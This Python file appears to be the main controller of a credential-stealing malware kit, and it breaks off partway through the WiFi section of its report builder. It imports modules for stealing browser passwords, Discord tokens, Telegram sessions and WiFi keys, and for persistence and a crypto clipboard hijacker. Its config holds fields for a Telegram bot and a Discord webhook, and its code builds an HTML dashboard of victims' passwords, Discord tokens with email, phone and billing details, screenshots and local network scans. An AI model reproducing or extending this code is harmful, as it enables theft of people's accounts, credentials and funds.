#!/usr/bin/env python3
"""
- Discord tokens: block parsing from Discord_Accounts.txt
- Network scanner: built‑in, no external dependencies
- All validations read actual files; report shows real data
"""

import os
import sys
import json
import zipfile
import tempfile
import shutil
import time
import base64
import socket
import subprocess
import ipaddress
import threading
from datetime import datetime

sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'modules'))

try:
    from modules.collected_info import get_system_info, capture
    from modules.telegram_steal import steal_telegram
    from modules.discord_token import steal_discord
    from modules.browser_stealer import steal_all_passwords, save_passwords
    from modules.persistence import PersistenceManager
    from modules.wifi_stealer import steal_wifi_passwords
    from modules.bot import ResultSender
    from modules.crypto_clipper import get_clipper
except ImportError as e:
    print(f"[!] Module import error: {e}")
    import traceback
    traceback.print_exc()
    sys.exit(1)

# ==================== CONFIG ====================
CONFIG = {
    "telegram_token": "",
    "telegram_chat_id": "",
    "discord_webhook": "",
    "enable_telegram": True,
    "enable_discord": True,
    "features": {
        "system_info": True,
        "screenshot": True,
        "browser_passwords": True,
        "discord_token": True,
        "telegram_session": True,
        "persistence": True,
        "network_scan": True,      
        "wifi_passwords": False,
        "crypto_clipper": True,
        "auto_brute": False
    },
    "crypto_addresses": {
        "Bitcoin": "testestesteststststststs",
        "Ethereum": "",
        "Litecoin": "",
        "Monero": "",
        "Dogecoin": "",
        "Ripple": "",
        "Tron": ""
    },
    "enabled_browsers": ["Chrome", "Edge", "Brave", "Opera", "Opera GX", "Vivaldi",
                        "Firefox", "Yandex Browser", "Chromium", "Others"]
}

def load_config():
    global CONFIG
    try:
        config_path = os.path.join(os.path.dirname(__file__), 'config.json')
        if os.path.exists(config_path):
            with open(config_path, 'r') as f:
                loaded = json.load(f)
                CONFIG.update(loaded)
                print(f"[*] Config loaded: {len(loaded)} keys")
    except Exception as e:
        print(f"[!] Config load error: {e}")

def encode_image_to_base64(image_path):
    try:
        if image_path and os.path.exists(image_path):
            with open(image_path, 'rb') as f:
                return base64.b64encode(f.read()).decode('utf-8')
    except Exception as e:
        print(f"[!] Image encode error: {e}")
    return None

# ==================== FILE VALIDATION FUNCTIONS ====================

def validate_system_info(output_dir):
    """Validate system_info.txt exists and read it"""
    sys_file = os.path.join(output_dir, "system_infos.txt")
    if not os.path.exists(sys_file):
        return None, "File not found"
    
    try:
        with open(sys_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        data = {
            "hostname": "Unknown",
            "username": "Unknown", 
            "platform": "Unknown",
            "processor": "Unknown",
            "cpu_cores": "Unknown",
            "ram_gb": "Unknown",
            "public_ip": "Unknown",
            "country_code": "XX"
        }
        
        for line in content.split('\n'):
            if ':' in line:
                key, val = line.split(':', 1)
                key = key.strip().lower()
                val = val.strip()
                
                if 'hostname' in key: data["hostname"] = val
                elif 'username' in key: data["username"] = val
                elif 'platform' in key: data["platform"] = val
                elif 'processor' in key: data["processor"] = val
                elif 'cpu cores' in key or 'cores' in key: data["cpu_cores"] = val
                elif 'ram' in key or 'memory' in key:
                    ram_val = val.replace('GB', '').replace('gb', '').replace('MB', '').replace('mb', '').strip()
                    try:
                        if 'MB' in val.upper():
                            ram_val = str(round(float(ram_val) / 1024, 2))
                        data["ram_gb"] = ram_val
                    except:
                        data["ram_gb"] = val
                elif 'public ip' in key or 'ip' in key: data["public_ip"] = val
                elif 'country' in key: data["country_code"] = val
        
        return data, "Valid"
    except Exception as e:
        return None, f"Read error: {e}"

def validate_screenshot(output_dir):
    """Validate screenshot exists - check all image files"""
    if not os.path.exists(output_dir):
        return None, "Output directory not found"
    
    files = os.listdir(output_dir)
    screenshot_names = ['screenshot', 'desktop_screenshot', 'screen', 'capture']
    extensions = ['.jpg', '.jpeg', '.png', '.bmp']
    
    for fname in files:
        fname_lower = fname.lower()
        for name in screenshot_names:
            if name in fname_lower:
                for ext in extensions:
                    if fname_lower.endswith(ext):
                        full_path = os.path.join(output_dir, fname)
                        if os.path.exists(full_path):
                            return full_path, f"Found: {fname}"
    
    for fname in files:
        fname_lower = fname.lower()
        if fname_lower.endswith(('.jpg', '.jpeg', '.png', '.bmp', '.gif')):
            full_path = os.path.join(output_dir, fname)
            return full_path, f"Found image: {fname}"
    
    return None, "No screenshot file found"

def validate_browser_passwords(output_dir):
    """Validate passwords.txt / Browser_Passwords.txt / .json"""
    pass_files = ["passwords.txt", "Browser_Passwords.txt", "Browser_Passwords.json"]
    pass_file = None
    for pf in pass_files:
        test_path = os.path.join(output_dir, pf)
        if os.path.exists(test_path):
            pass_file = test_path
            break
    if not pass_file:
        return [], 0, "File not found"
    
    try:
        # JSON parsing
        if pass_file.endswith('.json'):
            with open(pass_file, 'r', encoding='utf-8', errors='ignore') as f:
                data = json.load(f)
                if isinstance(data, list):
                    return data, len(data), f"{len(data)} passwords"
                elif isinstance(data, dict):
                    return [data], 1, "1 password"
        
        # Text parsing (entries separated by '---')
        passwords = []
        with open(pass_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        entries = content.split('---')
        for entry in entries:
            lines = entry.strip().split('\n')
            p_data = {"browser": "Unknown", "url": "N/A", "username": "N/A", "password": "N/A"}
            for line in lines:
                line = line.strip()
                if line.startswith('Browser:'): p_data["browser"] = line.split(':', 1)[1].strip()
                elif line.startswith('URL:'): p_data["url"] = line.split(':', 1)[1].strip()
                elif line.startswith('Username:'): p_data["username"] = line.split(':', 1)[1].strip()
                elif line.startswith('Password:'): p_data["password"] = line.split(':', 1)[1].strip()
            if p_data["url"] != "N/A" or p_data["password"] != "N/A":
                passwords.append(p_data)
        
        return passwords, len(passwords), f"{len(passwords)} passwords"
    except Exception as e:
        return [], 0, f"Parse error: {e}"

def validate_discord_tokens(output_dir):
    """CRITICAL FIX: Read Discord_Accounts.txt with robust block parsing"""
    discord_txt = os.path.join(output_dir, "Discord_Accounts.txt")
    tokens = []
    
    if not os.path.exists(discord_txt):
        return [], 0, "File not found"
    
    try:
        with open(discord_txt, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Split by the separator line (70 equals signs)
        blocks = content.split('=' * 70)
        
        for block in blocks:
            block = block.strip()
            if not block or "Account #" not in block:
                continue
            
            token_data = {}
            for line in block.split('\n'):
                line = line.strip()
                if line.startswith('Token:'):
                    token_data['token'] = line.split(':', 1)[1].strip()
                elif line.startswith('User ID:'):
                    token_data['user_id'] = line.split(':', 1)[1].strip()
                elif line.startswith('Username:'):
                    token_data['username'] = line.split(':', 1)[1].strip()
                elif line.startswith('Email:'):
                    token_data['email'] = line.split(':', 1)[1].strip()
                elif line.startswith('Phone:'):
                    token_data['phone'] = line.split(':', 1)[1].strip()
                elif line.startswith('Nitro:'):
                    token_data['nitro'] = line.split(':', 1)[1].strip()
                elif line.startswith('MFA:'):
                    token_data['mfa_enabled'] = line.split(':', 1)[1].strip()
            
            if token_data.get('token'):
                tokens.append(token_data)
        
        return tokens, len(tokens), f"{len(tokens)} accounts" if tokens else "No tokens found"
    except Exception as e:
        return [], 0, f"Parse error: {e}"

def validate_wifi_passwords(output_dir):
    """Validate WiFi passwords file"""
    wifi_file = os.path.join(output_dir, "wifi_passwords.txt")
    if not os.path.exists(wifi_file):
        return [], 0, "File not found"
    
    try:
        networks = []
        with open(wifi_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        entries = content.split('---')
        for entry in entries:
            lines = entry.strip().split('\n')
            w_data = {"ssid": "Unknown", "password": "N/A", "security": "WPA2"}
            for line in lines:
                line = line.strip()
                if 'SSID' in line or 'Network' in line:
                    if ':' in line:
                        w_data["ssid"] = line.split(':', 1)[1].strip()
                    else:
                        w_data["ssid"] = line.strip()
                elif 'Password' in line and ':' in line:
                    w_data["password"] = line.split(':', 1)[1].strip()
                elif 'Security' in line and ':' in line:
                    w_data["security"] = line.split(':', 1)[1].strip()
            if w_data["ssid"] != "Unknown":
                networks.append(w_data)
        
        return networks, len(networks), f"{len(networks)} networks"
    except Exception as e:
        return [], 0, f"Parse error: {e}"

def validate_telegram_session(output_dir):
    """Check if telegram_session folder exists with files"""
    tele_dir = os.path.join(output_dir, "telegram_session")
    if not os.path.exists(tele_dir):
        return False, "Not found", None
    files = os.listdir(tele_dir)
    if files:
        return True, f"{len(files)} files", tele_dir
    return False, "Empty folder", None

def validate_network_scan(output_dir):
    """Validate network_scan.json"""
    net_file = os.path.join(output_dir, "network_scan.json")
    if not os.path.exists(net_file):
        return None, "File not found"
    try:
        with open(net_file, 'r') as f:
            data = json.load(f)
        return data, "Valid"
    except Exception as e:
        return None, f"Parse error: {e}"

# ==================== BUILT-IN NETWORK SCANNER ====================
def get_local_network():
    """Get local IP and assume /24 subnet."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
        return str(network)
    except:
        return "192.168.1.0/24"  # fallback

def ping_host(ip):
    """Ping a host (cross-platform)."""
    param = "-n 1" if os.name == "nt" else "-c 1"
    command = f"ping {param} -w 1 {ip} >nul 2>&1" if os.name == "nt" else f"ping {param} -W 1 {ip} > /dev/null 2>&1"
    return subprocess.call(command, shell=True) == 0

def scan_network(network):
    """Scan all hosts in network and return list of active IPs."""
    active = []
    threads = []
    
    def check(ip):
        if ping_host(str(ip)):
            active.append(str(ip))
    
    for ip in ipaddress.IPv4Network(network):
        t = threading.Thread(target=check, args=(ip,))
        t.start()
        threads.append(t)
        if len(threads) > 50:  # limit concurrency
            for t in threads: t.join()
            threads = []
    for t in threads: t.join()
    return active

def run_network_scan_builtin(output_dir):
    """Simple network scanner that writes results to JSON."""
    print("    [*] Discovering local network...")
    network = get_local_network()
    print(f"    [*] Scanning {network} ...")
    
    active_ips = scan_network(network)
    
    devices = []
    for ip in active_ips:
        try:
            hostname = socket.gethostbyaddr(ip)[0]
        except:
            hostname = "Unknown"
        devices.append({
            "ip": ip,
            "hostname": hostname,
            "mac": "N/A",
            "status": "active"
        })
    
    result = {
        "timestamp": datetime.now().isoformat(),
        "network": network,
        "total_hosts": len(active_ips),
        "devices": devices
    }
    
    out_path = os.path.join(output_dir, "network_scan.json")
    with open(out_path, 'w') as f:
        json.dump(result, f, indent=2)
    
    print(f"    [*] Found {len(active_ips)} active hosts")
    return result

# ==================== HTML GENERATION ====================
def generate_html_report(output_dir, clipper_running=False):
    """Generate HTML report with EMBEDDED data - FIXED VERSION"""
    
    print("[*] Generating HTML report with embedded data...")
    print(f"    [*] Output directory: {output_dir}")
    
    # ========== PYTHON: READ ALL FILES AT GENERATION TIME ==========
    
    files = os.listdir(output_dir) if os.path.exists(output_dir) else []
    print(f"    [*] Files found: {files}")
    
    # List all files with details for debugging
    for f in files:
        fpath = os.path.join(output_dir, f)
        fsize = os.path.getsize(fpath) if os.path.isfile(fpath) else 0
        print(f"        - {f} ({fsize} bytes)")
    
    # Read System Info
    sys_data = {"hostname": "Unknown", "username": "Unknown", "platform": "Unknown", 
                "processor": "Unknown", "cpu_cores": "Unknown", "ram_gb": "Unknown",
                "public_ip": "Unknown", "country_code": "XX", "raw_lines": []}
    
    sys_file = os.path.join(output_dir, "system_infos.txt")
    has_system = False
    if os.path.exists(sys_file):
        try:
            with open(sys_file, 'r', encoding='utf-8', errors='ignore') as f:
                sys_data["raw_lines"] = f.readlines()
                has_system = len(sys_data["raw_lines"]) > 0
                for line in sys_data["raw_lines"]:
                    if ':' in line:
                        key, val = line.split(':', 1)
                        key = key.strip().lower()
                        val = val.strip()
                        if 'hostname' in key: sys_data["hostname"] = val
                        elif 'username' in key: sys_data["username"] = val
                        elif 'platform' in key: sys_data["platform"] = val
                        elif 'processor' in key: sys_data["processor"] = val
                        elif 'cpu cores' in key: sys_data["cpu_cores"] = val
                        elif 'ram' in key or 'memory' in key:
                            ram_val = val.replace('GB', '').replace('gb', '').replace('MB', '').replace('mb', '').strip()
                            try:
                                if 'MB' in val.upper():
                                    ram_val = str(round(float(ram_val) / 1024, 2))
                                sys_data["ram_gb"] = ram_val
                            except:
                                sys_data["ram_gb"] = val
                        elif 'public ip' in key: sys_data["public_ip"] = val
                        elif 'country' in key: sys_data["country_code"] = val
        except Exception as e:
            print(f"    [!] Error reading system info: {e}")
    
    # Read Screenshot
    screenshot_b64 = None
    screenshot_file = None
    has_screenshot = False
    image_files = [f for f in files if f.lower().endswith(('.jpg', '.jpeg', '.png', '.bmp', '.gif'))]
    if image_files:
        screenshot_file = image_files[0]
        try:
            with open(os.path.join(output_dir, screenshot_file), 'rb') as f:
                screenshot_b64 = base64.b64encode(f.read()).decode('utf-8')
                has_screenshot = True
        except Exception as e:
            print(f"    [!] Error encoding screenshot: {e}")
    
    ext = os.path.splitext(screenshot_file or '')[1].lower()
    mime_type = 'image/jpeg' if ext in ['.jpg', '.jpeg'] else 'image/png' if ext == '.png' else 'image/bmp' if ext == '.bmp' else 'image/jpeg'
    
    # ========== FIXED: READ ALL BROWSER PASSWORD FILES ==========
    passwords_data = []
    has_passwords = False
    
    # Check all possible password file names
    password_file_patterns = [
        'Browser_Passwords.json', 'Browser_Passwords.txt',
        'passwords.json', 'passwords.txt',
        'Chrome_Passwords.txt', 'Edge_Passwords.txt',
        'Firefox_Passwords.txt', 'Brave_Passwords.txt',
        'Opera_Passwords.txt', 'All_Passwords.txt',
        'Login Data.json', 'logins.json'
    ]
    
    print(f"    [*] Searching for password files...")
    for pf in password_file_patterns:
        ppath = os.path.join(output_dir, pf)
        if os.path.exists(ppath):
            print(f"        Found: {pf} ({os.path.getsize(ppath)} bytes)")
            try:
                if pf.endswith('.json'):
                    with open(ppath, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        new_passwords = data if isinstance(data, list) else [data]
                        passwords_data.extend(new_passwords)
                        has_passwords = True
                        print(f"        [+] Loaded {len(new_passwords)} from JSON")
                else:
                    with open(ppath, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        # Try multiple separators
                        separators = ['---', '===', '\n\n\n', 'Browser:', 'URL:']
                        entries = [content]
                        for sep in separators:
                            if sep in content:
                                entries = content.split(sep)
                                break
                        
                        entry_count = 0
                        for entry in entries:
                            lines = entry.strip().split('\n')
                            p = {"browser": "Unknown", "url": "N/A", "username": "N/A", "password": "N/A"}
                            for line in lines:
                                line_lower = line.lower()
                                if 'browser' in line_lower and ':' in line:
                                    p["browser"] = line.split(':', 1)[1].strip()
                                elif 'url' in line_lower and ':' in line:
                                    p["url"] = line.split(':', 1)[1].strip()
                                elif 'username' in line_lower and ':' in line:
                                    p["username"] = line.split(':', 1)[1].strip()
                                elif 'password' in line_lower and ':' in line:
                                    p["password"] = line.split(':', 1)[1].strip()
                                elif 'host' in line_lower and ':' in line and p["url"] == "N/A":
                                    p["url"] = line.split(':', 1)[1].strip()
                                elif 'login' in line_lower and ':' in line and p["username"] == "N/A":
                                    p["username"] = line.split(':', 1)[1].strip()
                                elif 'pass' in line_lower and ':' in line and p["password"] == "N/A":
                                    p["password"] = line.split(':', 1)[1].strip()
                            
                            # Validate entry
                            if (p["url"] != "N/A" and p["url"]) or (p["password"] != "N/A" and p["password"]):
                                passwords_data.append(p)
                                entry_count += 1
                        
                        if entry_count > 0:
                            has_passwords = True
                            print(f"        [+] Parsed {entry_count} entries from {pf}")
            except Exception as e:
                print(f"        [!] Error reading {pf}: {e}")
    
    # Remove duplicates based on URL+Username
    seen = set()
    unique_passwords = []
    for p in passwords_data:
        key = f"{p.get('url', '')}:{p.get('username', '')}"
        if key not in seen and key != ':':
            seen.add(key)
            unique_passwords.append(p)
    
    passwords_data = unique_passwords
    print(f"    [+] Total unique passwords: {len(passwords_data)}")
    
    # ========== FIXED: DISCORD DETECTION WITH UNICODE SEPARATOR ==========
    print(f"    [*] Checking for Discord files...")
    
    discord_accounts = []
    has_discord = False
    discord_file_used = None
    discord_error = None
    
    discord_txt_path = os.path.join(output_dir, "Discord_Accounts.txt")
    discord_json_path = os.path.join(output_dir, "discord_tokens.json")
    
    print(f"        Checking: {discord_txt_path} -> Exists: {os.path.exists(discord_txt_path)}")
    print(f"        Checking: {discord_json_path} -> Exists: {os.path.exists(discord_json_path)}")
    
    if os.path.exists(discord_txt_path):
        try:
            print(f"        Reading Discord_Accounts.txt...")
            with open(discord_txt_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                content_len = len(content)
                print(f"        File size: {content_len} bytes")
                
                if content_len < 50:
                    discord_error = "File exists but is empty"
                else:
                    discord_file_used = "Discord_Accounts.txt"
                    
                    # FIXED: Try multiple separator types including Unicode box drawing
                    separators = [
                        '═══════════════════════════════════════════════════════════════',  # Unicode ═
                        '============================================================',   # ASCII =
                        '======================================================================',
                        '\n\n\n',
                        'DISCORD ACCOUNT'
                    ]
                    
                    entries = []
                    used_sep = None
                    
                    for sep in separators:
                        if sep in content:
                            entries = content.split(sep)
                            used_sep = sep[:20] + '...'
                            print(f"        [+] Using separator: {used_sep} ({len(entries)} parts)")
                            break
                    
                    if not entries:
                        entries = [content]
                        print(f"        [!] No separator found, treating as single entry")
                    
                    for entry_idx, entry in enumerate(entries):
                        entry = entry.strip()
                        if len(entry) < 50:
                            continue
                        
                        acc = {}
                        lines = entry.split('\n')
                        
                        for line in lines:
                            line = line.strip()
                            if not line or len(line) < 3:
                                continue
                            
                            # Parse "Key - Value" format with flexible matching
                            # Handle: " - Key : Value" or "- Key - Value" or "Key: Value"
                            match = None
                            
                            # Try " - Key : Value" format (your file format)
                            if ' - ' in line:
                                # Remove leading " - " if present
                                clean_line = line.lstrip(' -')
                                if ':' in clean_line:
                                    parts = clean_line.split(':', 1)
                                    match = (parts[0].strip(), parts[1].strip())
                                elif ' - ' in clean_line:
                                    parts = clean_line.split(' - ', 1)
                                    match = (parts[0].strip(), parts[1].strip())
                            # Try "Key: Value" format
                            elif ':' in line:
                                parts = line.split(':', 1)
                                key = parts[0].strip()
                                # Skip lines that are just URLs or paths without keys
                                if len(key) > 0 and not key.startswith('http') and not key.startswith('C:\\'):
                                    match = (key, parts[1].strip() if len(parts) > 1 else '')
                            
                            if match:
                                key, value = match
                                key_lower = key.lower()
                                
                                # Map fields
                                if 'token' in key_lower:
                                    acc['token'] = value
                                elif 'username' in key_lower and 'display' not in key_lower:
                                    acc['username'] = value
                                elif 'display name' in key_lower:
                                    acc['display_name'] = value
                                elif 'id' in key_lower and 'user' not in key_lower:
                                    acc['user_id'] = value
                                elif 'user id' in key_lower:
                                    acc['user_id'] = value
                                elif 'email' in key_lower and 'verified' not in key_lower:
                                    acc['email'] = value
                                elif 'email verified' in key_lower or 'verified' in key_lower:
                                    acc['email_verified'] = value
                                elif 'phone' in key_lower:
                                    acc['phone'] = value
                                elif 'nitro' in key_lower:
                                    acc['nitro'] = value
                                elif 'language' in key_lower:
                                    acc['language'] = value
                                elif 'billing' in key_lower:
                                    acc['billing'] = value
                                elif 'gift' in key_lower:
                                    acc['gift_code'] = value
                                elif 'avatar' in key_lower or 'picture' in key_lower or 'profile' in key_lower:
                                    acc['avatar'] = value
                                elif 'mfa' in key_lower or 'multi-factor' in key_lower or 'auth' in key_lower:
                                    acc['mfa'] = value
                                elif 'path' in key_lower or 'software' in key_lower or 'found' in key_lower:
                                    acc['path'] = value
                        
                        # Validate: must have token
                        if acc.get('token') and len(acc['token']) > 30:
                            discord_accounts.append(acc)
                            print(f"        [+] Account {len(discord_accounts)}: {acc.get('username', 'Unknown')} (ID: {acc.get('user_id', 'N/A')[:20]}...)")
                        elif entry_idx < 3:
                            print(f"        [!] Entry {entry_idx} rejected: has_token={bool(acc.get('token'))}")
                    
                    has_discord = len(discord_accounts) > 0
                    print(f"    [+] Discord parsing complete: {len(discord_accounts)} accounts")
                    
        except Exception as e:
            print(f"    [!] Error parsing Discord_Accounts.txt: {e}")
            import traceback
            traceback.print_exc()
            discord_error = str(e)
    
    # JSON fallback
    if not has_discord and os.path.exists(discord_json_path):
        try:
            print(f"    [*] Trying discord_tokens.json fallback...")
            with open(discord_json_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
                discord_accounts = data if isinstance(data, list) else [data]
                has_discord = len(discord_accounts) > 0
                discord_file_used = "discord_tokens.json"
                print(f"    [+] Discord loaded from JSON: {len(discord_accounts)} accounts")
        except Exception as e:
            print(f"    [!] Error parsing discord_tokens.json: {e}")
            if not discord_error:
                discord_error = str(e)
    
    if not has_discord:
        print(f"    [!] NO DISCORD ACCOUNTS FOUND")
        if discord_error:
            print(f"        Error: {discord_error}")
    
    # Read WiFi
    wifi_networks = []
    has_wifi = False
    wifi_file = os.path.join(output_dir, "wifi_passwords.txt")
    if os.path.exists(wifi_file):
        try:
            with open(wifi_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                entries = content.split('---')
                for entry in entries:
                    lines = entry.strip().split('\n')
                    net = {"ssid": "Unknown", "password": "N/A", "security": "WPA2"}
                    for line in lines:
                        if 'SSID' in line and ':' in line:
                            net["ssid"] = line.split(':', 1)[1].strip()
                        elif 'Password' in line and ':' in line:
                            net["password"] = line.split(':', 1)[1].strip()
                        elif 'Security' in line and ':' in line:
                            net["security"] = line.split(':', 1)[1].strip()
                    if net["ssid"] != "Unknown":
                        wifi_networks.append(net)
                has_wifi = len(wifi_networks) > 0
                print(f"    [+] WiFi loaded: {len(wifi_networks)} networks")
        except Exception as e:
            print(f"    [!] Error reading WiFi: {e}")
    
    # Read Network
    network_data = None
    has_network = False
    net_file = os.path.join(output_dir, "network_scan.json")
    if os.path.exists(net_file):
        try:
            with open(net_file, 'r', encoding='utf-8') as f:
                network_data = json.load(f)
                has_network = True
                print(f"    [+] Network scan loaded")
        except Exception as e:
            print(f"    [!] Error reading network scan: {e}")
    
    # Telegram
    has_telegram = os.path.exists(os.path.join(output_dir, "telegram_session"))
    tele_file_count = 0
    if has_telegram:
        try:
            tele_file_count = len(os.listdir(os.path.join(output_dir, "telegram_session")))
        except:
            pass
    
    # Crypto config
    crypto_addresses = CONFIG.get("crypto_addresses", {})
    active_cryptos = {k: v for k, v in crypto_addresses.items() if v and v.strip()}
    has_crypto = len(crypto_addresses) > 0
    
    # ========== BUILD HTML ==========
    
    print(f"    [*] Building HTML...")
    print(f"        Passwords: {len(passwords_data)}, Discord: {len(discord_accounts)}, WiFi: {len(wifi_networks)}")
    
    # Build status cards
    def status_card(icon, name, found, detail, section_id):
        card_class = 'status-ok' if found else 'status-warn'
        badge = '[Found]' if found else '[Not Found]'
        color = '#00ff88' if found else '#ffaa00'
        return f'''
        <div class="status-card {card_class}" onclick="toggleSection('{section_id}')" style="cursor: pointer;">
            <strong>{icon} {name}</strong><br>
            <span style="color:{color};font-weight:bold;">{badge}</span> <small style="color:#888;">{detail}</small>
        </div>'''
    
    discord_detail = f"{len(discord_accounts)} accounts" if has_discord else (discord_error or 'Not found')
    
    status_cards = [
        status_card('💻', 'System Info', has_system, f"{len(sys_data['raw_lines'])} lines" if has_system else 'Not found', 'system-section'),
        status_card('📸', 'Screenshot', has_screenshot, screenshot_file if has_screenshot else 'Not found', 'screenshot-section'),
        status_card('🔐', 'Passwords', has_passwords, f"{len(passwords_data)} entries" if has_passwords else 'Not found', 'passwords-section'),
        status_card('🎮', 'Discord', has_discord, discord_detail, 'discord-section'),
        status_card('✈️', 'Telegram', has_telegram, f"{tele_file_count} files" if has_telegram else 'Not found', 'telegram-section'),
        status_card('📶', 'WiFi', has_wifi, f"{len(wifi_networks)} networks" if has_wifi else 'Not found', 'wifi-section'),
        status_card('🌐', 'Network', has_network, 'Valid JSON' if has_network else 'Not found', 'network-section'),
        status_card('₿', 'Clipper', clipper_running, f"Running ({len(active_cryptos)}/{len(crypto_addresses)})" if clipper_running else 'Stopped', 'clipper-section')
    ]
    
    status_grid_html = '\n'.join(status_cards)
    
    # Build sections
    sections_html = []
    
    # System Info
    if has_system:
        sys_rows = ''.join([f"<tr><td>{line.split(':', 1)[0].strip()}</td><td>{line.split(':', 1)[1].strip() if ':' in line else ''}</td></tr>" 
                          for line in sys_data["raw_lines"] if ':' in line])
        sections_html.append(f'''
        <div class="section" id="system-section" style="display: none;">
            <h2>💻 System Information <span class="file-badge">system_infos.txt</span></h2>
            <table><tr><th>Property</th><th>Value</th></tr>{sys_rows}</table>
        </div>''')
    
    # Screenshot
    if has_screenshot:
        sections_html.append(f'''
        <div class="section" id="screenshot-section" style="display: none;">
            <h2>📸 Screenshot <span class="file-badge">{screenshot_file}</span></h2>
            <div class="screenshot-container">
                <img src="data:{mime_type};base64,{screenshot_b64}" class="screenshot-img" alt="Desktop Screenshot">
            </div>
        </div>''')
    
    # Passwords - EMBEDDED
    if has_passwords and len(passwords_data) > 0:
        pwd_json = json.dumps(passwords_data)
        sections_html.append(f'''
        <div class="section" id="passwords-section" style="display: none;">
            <h2>🔐 Browser Passwords <span class="file-badge">{len(passwords_data)} entries (all browsers)</span></h2>
            <div id="passwords-container"></div>
            <script>
                (function() {{
                    const passwords = {pwd_json};
                    let html = '<table><tr><th>Browser</th><th>URL</th><th>Username</th><th>Password</th></tr>';
                    passwords.forEach(p => {{
                        html += `<tr>
                            <td>${{p.browser || 'Unknown'}}</td>
                            <td style="max-width: 300px; overflow: hidden; text-overflow: ellipsis;" title="${{p.url || ''}}">${{p.url || 'N/A'}}</td>
                            <td>${{p.username || 'N/A'}}</td>
                            <td><span class="token-cell" style="cursor: pointer;" onclick="navigator.clipboard.writeText('${{p.password}}'); this.style.color='#00ff88'; setTimeout(()=>this.style.color='', 500);" title="Click to copy">${{p.password || 'N/A'}}</span></td>
                        </tr>`;
                    }});
                    html += '</table>';
                    document.getElementById('passwords-container').innerHTML = html;
                }})();
            </script>
        </div>''')
    
    # Discord - EMBEDDED
    if has_discord and len(discord_accounts) > 0:
        discord_json = json.dumps(discord_accounts)
        sections_html.append(f'''
        <div class="section" id="discord-section" style="display: none;">
            <h2>🎮 Discord Accounts <span class="file-badge">{len(discord_accounts)} accounts from {discord_file_used or "file"}</span></h2>
            <div id="discord-container"></div>
            <script>
                (function() {{
                    const accounts = {discord_json};
                    let html = '<div class="success-notice">✅ {{accounts.length}} Discord account(s) loaded</div>';
                    
                    accounts.forEach((acc, idx) => {{
                        html += `<div style="margin-bottom: 2rem; border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; background: rgba(0,0,0,0.2);">
                            <h3 style="color: var(--primary); margin-top: 0; margin-bottom: 1rem; border-bottom: 1px solid var(--border); padding-bottom: 0.5rem;">
                                👤 Account #${{idx + 1}} ${{acc.username ? '- ' + acc.username : ''}}
                            </h3>`;
                        
                        if (acc.token) {{
                            html += `<div class="discord-detail" style="border-left-color: var(--success); background: rgba(0,255,136,0.05);">
                                <span class="discord-label">🔑 Token:</span>
                                <span class="token-cell" style="cursor: pointer;" onclick="navigator.clipboard.writeText(this.textContent); this.style.color='#00ff88'; setTimeout(()=>this.style.color='', 500);" title="Click to copy">${{acc.token}}</span>
                            </div>`;
                        }}
                        
                        html += '<div style="margin-top: 1rem;">';
                        if (acc.username) html += `<div class="discord-detail"><span class="discord-label">👤 Username:</span>${{acc.username}}</div>`;
                        if (acc.display_name) html += `<div class="discord-detail"><span class="discord-label">🏷️ Display:</span>${{acc.display_name}}</div>`;
                        if (acc.user_id) html += `<div class="discord-detail"><span class="discord-label">🆔 User ID:</span>${{acc.user_id}}</div>`;
                        html += '</div>';
                        
                        html += '<div style="margin-top: 1rem;">';
                        if (acc.email) html += `<div class="discord-detail"><span class="discord-label">📧 Email:</span>${{acc.email}} ${{acc.email_verified ? '✅ Verified' : ''}}</div>`;
                        if (acc.phone) html += `<div class="discord-detail"><span class="discord-label">📱 Phone:</span>${{acc.phone}}</div>`;
                        html += '</div>';
                        
                        html += '<div style="margin-top: 1rem;">';
                        if (acc.nitro) html += `<div class="discord-detail"><span class="discord-label">💎 Nitro:</span>${{acc.nitro}}</div>`;
                        if (acc.mfa) html += `<div class="discord-detail"><span class="discord-label">🔒 MFA:</span>${{acc.mfa}}</div>`;
                        if (acc.language) html += `<div class="discord-detail"><span class="discord-label">🌐 Language:</span>${{acc.language}}</div>`;
                        html += '</div>';
                        
                        if (acc.billing || acc.avatar || acc.path) {{
                            html += '<div style="margin-top: 1rem;">';
                            if (acc.billing) html += `<div class="discord-detail"><span class="discord-label">💳 Billing:</span>${{acc.billing}}</div>`;
                            if (acc.avatar) html += `<div class="discord-detail"><span class="discord-label">🖼️ Avatar:</span><a href="${{acc.avatar}}" target="_blank" style="color: var(--primary);">${{acc.avatar.substring(0, 50)}}...</a></div>`;
                            if (acc.path) html += `<div class="discord-detail"><span class="discord-label">📁 Path:</span>${{acc.path}}</div>`;
                            html += '</div>';
                        }}
                        
                        html += '</div>';
                    }});
                    
                    document.getElementById('discord-container').innerHTML = html;
                }})();
            </script>
        </div>''')
    else:
        # Error section
        if os.path.exists(discord_txt_path):
            sections_html.append(f'''
        <div class="section" id="discord-section" style="display: none;">
            <h2>🎮 Discord Accounts <span class="file-badge">Parse Error</span></h2>
            <div class="error-box">
                ❌ File exists but could not parse accounts<br>
                <small>{discord_error or "Check console for details"}</small>
            </div>
        </div>''')
    
    # WiFi
    if has_wifi:
        wifi_json = json.dumps(wifi_networks)
        sections_html.append(f'''
        <div class="section" id="wifi-section" style="display: none;">
            <h2>📶 WiFi Networks <span class="file-badge">{len(wifi_networks)} networks</span></h2>
            <div id="wifi-container"></div>
            <script>
                (function() {{
                    const networks = {wifi_json};
                    let html = '<table><tr><th>SSID</th><th>Password</th><th>Security</th></tr>';
                    networks.forEach(n => {{
                        html += `<tr><td>${{n.ssid}}</td><td class="token-cell" style="cursor: pointer;" onclick="navigator.clipboard.writeText('${{n.password}}')">${{n.password}}</td><td>${{n.security}}</td></tr>`;
                    }});
                    html += '</table>';
